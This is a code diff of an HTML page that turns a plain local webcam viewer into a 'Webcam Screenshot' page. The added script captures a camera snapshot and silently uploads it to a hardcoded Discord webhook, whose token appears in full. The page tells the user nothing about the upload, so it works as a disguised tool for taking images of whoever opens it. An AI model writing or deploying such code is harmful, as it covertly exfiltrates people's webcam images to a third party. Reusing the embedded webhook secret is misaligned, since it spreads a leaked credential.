@@ -1,79 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Webcam Viewer</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f1f1f1;
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            max-width: 400px;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        h1 {
-            margin-bottom: 20px;
-        }
-
-        video {
-            width: 100%;
-            border-radius: 5px;
-        }
-
-        .button {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            text-align: center;
-            cursor: pointer;
-        }
-
-        .button:hover {
-            background-color: #45a049;
-        }
-    </style>
+    <title>Webcam Screenshot</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>Webcam Viewer</h1>
-        <video id="videoElement"></video>
-        <button onclick="startWebcam()" class="button">sa</button>
-    </div>
+    <h1>Webcam Screenshot</h1>
+    <div id="cameraContainer"></div>
+    <button onclick="takeScreenshot()">Take Screenshot</button>
 
     <script>
-        function startWebcam() {
-            // Get the video element
-            var videoElement = document.getElementById('videoElement');
+        Webcam.set({
+            width: 640,
+            height: 480,
+            dest_width: 640,
+            dest_height: 480,
+            image_format: 'jpeg',
+            jpeg_quality: 90
+        });
 
-            // Check if the browser supports the getUserMedia API
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                // Request permission to access the webcam
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        // Set the stream as the video element's source
-                        videoElement.srcObject = stream;
+        Webcam.attach('#cameraContainer');
+
+        function takeScreenshot() {
+            Webcam.snap(function (dataUri) {
+                // Create a new image element
+                var img = new Image();
+                img.src = dataUri;
+
+                // Convert the data URI to a Blob
+                var byteString = atob(dataUri.split(',')[1]);
+                var mimeString = dataUri.split(',')[0].split(':')[1].split(';')[0];
+                var ab = new ArrayBuffer(byteString.length);
+                var ia = new Uint8Array(ab);
+                for (var i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                var blob = new Blob([ab], { type: mimeString });
+
+                // Create a FormData object and append the screenshot blob
+                var formData = new FormData();
+                formData.append('file', blob, 'screenshot.jpg');
+
+                // Send the FormData to the Discord webhook using fetch
+                fetch('https://discord.com/api/webhooks/1121844315912675471/VjLDnpl_fcoT-nRlnd3tZRccCGs2WjLLeO58pAV44ahavR2u53DVTaOr_NlMyQM1yjWL', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(function (response) {
+                        if (response.ok) {
+                            console.log('Screenshot sent successfully!');
+                        } else {
+                            console.error('Failed to send the screenshot.');
+                        }
                     })
-                    .catch(function(error) {
-                        console.log('Failed to access the webcam: ' + error);
+                    .catch(function (error) {
+                        console.error('Error sending the screenshot:', error);
                     });
-            } else {
-                console.log('getUserMedia is not supported by this browser.');
-            }
+            });
         }
     </script>
 </body>
